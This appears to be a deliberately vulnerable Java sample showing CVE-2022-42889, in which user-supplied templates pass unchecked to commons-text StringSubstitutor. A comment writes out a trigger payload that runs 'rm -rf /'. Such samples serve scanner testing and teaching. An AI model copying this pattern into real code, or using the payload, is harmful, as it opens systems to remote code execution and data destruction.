package com.example;

import org.apache.commons.text.StringSubstitutor;

/**
 * Renders user-supplied template strings via StringSubstitutor —
 * pre-1.10 commons-text evaluates ${script:...} / ${url:...} /
 * ${dns:...} prefixes, achieving RCE / SSRF / data exfiltration.
 */
public class TemplateRenderer {

    public String render(String template) {
        // CVE-2022-42889 trigger: attacker-controlled template like
        // "${script:javascript:Runtime.getRuntime().exec('rm -rf /')}"
        return new StringSubstitutor().replace(template);
    }
}
